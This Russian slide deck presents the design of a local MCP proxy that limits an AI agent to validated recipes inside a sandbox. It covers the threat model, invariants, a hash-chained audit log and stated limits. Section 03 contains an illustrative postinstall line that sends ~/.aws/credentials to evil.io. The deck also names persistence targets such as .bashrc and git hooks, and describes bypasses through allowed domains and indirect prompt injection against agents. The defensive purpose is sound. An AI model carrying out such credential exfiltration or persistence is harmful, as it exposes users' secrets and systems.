01

Проблема

У агента есть shell — значит, у него есть всё

mcpproxyдемо · архитектура

Модель говорит, что сделать. Прокси решает, чем это сделать. ОС решает, что запущенное может. Человек видит всё три.

Что даёт прямой терминал

  • 01Инъекция команд — произвольный текст доезжает до Bash
  • 02Несанкционированный доступ к файлам — граница директории существует только на словах
  • 03Утечка секретов — процесс наследует окружение целиком
  • 04Действия, продиктованные недоверенным контентом — indirect prompt injection из логов, issue, README

Прямой вызов скрипта не даёт ни песочницы, ни аудита, ни подтверждений.

Гипотеза

Локальный MCP-прокси, который отдаёт модели только предопределённые инструменты и валидирует их параметры, позволяет автоматизировать локальные задачи, не выдавая модели произвольный shell. Никакого execute_command. Рецепт — это capability.

В чём новизна — и в чём её нет

Неверно: «новизна в том, что мы делаем allowlist бинарей и валидируем параметры». Это уже сделано и лежит на GitHub.

Верно: allowlist защищает от того, что модель попросит запустить. Он ничего не делает против того, что запущенный код сделает. Существующие решения останавливаются на первом. Мы делаем второе — и показываем это человеку.

02

Топология

Три части, потому что Electron не может быть хостом MCP-сервера

Почему именно так — ADR-0001

КомпонентПочему отдельно
shimклиент требует stdio-subprocess; он обязан быть дешёвым и одноразовым
mcpproxydодна точка истины на все сессии, переживает перезапуск клиента
packages/coreвся логика демона как библиотека без единого импорта Electron — CI без дисплея
desktopподтверждения обязаны быть вне контекста модели

Спавнить Electron на каждую сессию неприемлемо: множественные окна, тяжёлый старт, нет единого аудита. Приложение не запущено — shim его поднимает; флаг --require-ui включает строгий fail-closed.

Сокет — граница безопасности

  • И5по IPC приходит {recipeName, params, sessionId} — никогда argv и никогда путь к бинарю
  • И6unix-сокет 0600 в каталоге 0700, per-session токен вне конфига и вне argv shim'а

Спецификация MCP описывает атаку «stdio Transport Security in Proxy Scenarios» буквально про эту архитектуру: прокси, который спавнит процессы, плюс украденный токен = RCE. Полный контроль над сокетом даёт только вызов существующих рецептов с валидируемыми параметрами.

Честно: проверки peer credentials нет — LOCAL_PEERCRED недостижим из чистого Node (проба П11). Свойство «подключается только этот пользователь» держат права каталога 0700, которые ОС применяет при разрешении пути.

03

Центральный тезис · кульминация демо

Две линии обороны

Линия 1 — валидатор

контролирует модель

Что именно запускается

argv · схемы параметров · realpath + confinement

— argv собран →

Линия 2 — песочница

контролирует код

Что запущенное может сделать

ФС · сеть · лимиты · нарушения в таймлайн

Цепочка, которую валидатор не видит

pnpm test
 └─ package.json из репо (изменяем кем угодно)
     └─ vitest
         └─ ~1200 пакетов из node_modules
             └─ postinstall → fetch('https://evil.io',
                    body: ~/.aws/credentials)

Параметры валидны · бинарь в allowlist · директория правильная · ключи утекли. Валидатор отработал безупречно. Утечку принёс код, который этот валидный вызов запустил — внутрь процесса валидатор не видит.

Сценарий S5 — один вызов, два клика

РежимТестыСетьФС
none прошли ✅ 🔴 evil.io:443 — 1.2 KB отправлено 🔴 ~/.aws/credentials прочитан
seatbelt прошли ✅ 🟢 denied, 0 байт 🟢 denied

Baseline none — наблюдающий, а не слепой: тот же HTTP/SOCKS5-прокси отдаётся ребёнку через proxy-переменные, поэтому эксфильтрация видна и посчитана в байтах — просто не запрещена. Это ожидаемая картина демо-сценария S5, а не результат замера: прогона red-team корпуса ещё не было.

Оговорка Фильтрация идёт по доменам, а не по содержимому. Замените evil.io на разрешённый api.github.com — эксфильтрация в собственный gist атакующего пройдёт. Domain fronting тоже обходится. Мы поднимаем стоимость атаки; мы не делаем её невозможной.

04

Механика

Путь вызова, инварианты, права

Стадии вызова = события таймлайна

01received 02lock_check · rug pull? 03validate 04resolve_paths 05build_argv 06classify_risk 07approval · если high 08build_env 09build_profile 10spawn 11redact 12complete 13violation · 0..n

Видно, на каком шаге вызов остановился — эта пошаговость и делает демо наглядным. Во frozen stageOrder тринадцать стадий; успешный вызов даёт двенадцать событий: violation помечен как «может произойти много раз», и ноль — легальное число. Стадия, до которой вызов не дошёл, не даёт события вовсе.

Инварианты — фиксируются в коде и тестах

  • И1Нет shell. Никогда. Только spawn(argv[]). Строки команды не существует — инжектить не во что
  • И2Параметры не склеиваются, а занимают слоты argv
  • И3Пути — realpath + confinement. Проверка «нет ..» обходится симлинком за десять секунд
  • И4Env-allowlist: секрет не попадает в процесс. Редакция вывода — страховочная сетка, не основной механизм
  • И5Демон принимает имена рецептов, а не команды
  • И6IPC-сокет — граница безопасности
  • И7Вывод скрипта — недоверенные данные: маркер, скан, обрезка (OWASP ASI01)
  • И8Electron IPC — тоже граница: contextIsolation, sandbox, жёсткий CSP

Права песочницы — асимметричны

ОперацияПо умолчаниюПриоритет
ЧтениеразрешеноallowRead бьёт denyRead
ЗаписьзапрещеноdenyWrite бьёт allowWrite
Сетьзапрещенадоменный allowlist через прокси

Mandatory deny — не снимается даже явным allow: .bashrc .zshrc .profile .gitconfig .git/hooks/ .vscode/ .idea/ .claude/commands/. Это persistence-векторы: запись туда даёт исполнение позже, уже вне песочницы.

Аудит — hash-chain

self = sha256(utf8(
  canonicalizeJcs({ prev, event })))

Хэшируется всё событие целиком вместе со ссылкой на предыдущую запись — перечисление полей было бы дырой. Проверяется не только дайджест, но и связь: prev каждой записи обязан совпадать с self предыдущей.

Чего цепочка не ловит: обрезание хвоста лога — удалив последние записи целиком, атакующий оставляет цепочку согласованной. Нужен внешний якорь.

05

Честные границы

Где мы сильны, где частично и где нас нет

● Защищаем хорошо

  • —Инъекция через параметры — структурная защита, строки команды не существует
  • —Выход за границы директорий — две независимые линии
  • —Утечка секретов из окружения — защита на входе, а не фильтр на выходе
  • —Эксфильтрация в неразрешённый домен — deny-by-default на всё дерево процессов
  • —Persistence через shell-конфиги и git-hooks — неснимаемый deny
  • —Тихая подмена рецепта — lock-файл + diff-approve
  • —Подделка подтверждения — out-of-band канал вне контекста модели

◐ Защищаем частично

  • —Разрешённый домен: фильтруем по домену, не по содержимому
  • —Indirect prompt injection в выводе: помечен, отсканирован, обрезан — но модель его всё равно читает. Уменьшаем вероятность, не устраняем класс
  • —Редакция секретов: энтропия ловит 1 % токенов длиной 23 символа, 29 % — 28, 98 % — 40. Для hex порога не существует вовсе: ключ Twilio (p50 3.62) и git sha (3.70) неотличимы
  • —ReDoS: RE2 закрывает демон, но строка pattern уезжает MCP-клиенту в inputSchema, а его движок бэктрекает
  • —Учётные данные пира сокета не проверяем — свойство держат права каталога 0700
  • —Усталость от подтверждений: если high-risk станет частым, человек начнёт нажимать не глядя

○ Не защищаем вообще

  • —Злонамеренного пользователя — это его машина
  • —Ядро macOS и сам sandbox-exec — Apple формально считает его deprecated
  • —Саму модель — влияем только на то, что она физически может вызвать
  • —Провенанс пакетов — ловим поведение в рантайме, подписи не проверяем
  • —Tamper-proof аудит — наш лог tamper-evident
  • —Корпоративные сценарии — RBAC и SSO это задача MCP-гейтвеев

Статус среза:

seatbelt — основная none — baseline container — заглушка Windows / Linux — не реализованы Merkle-корень — вне среза

Формулировка для сцены

Мы не решаем prompt injection. Мы сводим поверхность к нулю там, где раньше был shell, и делаем всё остальное видимым.

Мы не делаем атаку невозможной. Мы поднимаем её стоимость и гарантируем, что она оставит след.

Что честно считать провалом — пороги зафиксированы до прогона

  • ✕корпус атак пробивается через аргументы, пути или вывод
  • ✕типовые задачи требуют больше 5 % исключений
  • ✕ложные блокировки выше 5 %
  • ✕baseline none показывает ASR, близкий к seatbelt-режиму

Цифр ASR и Utility на слайдах нет намеренно: прогона не было. Подгонять пороги после замера — значит не проводить эксперимент.
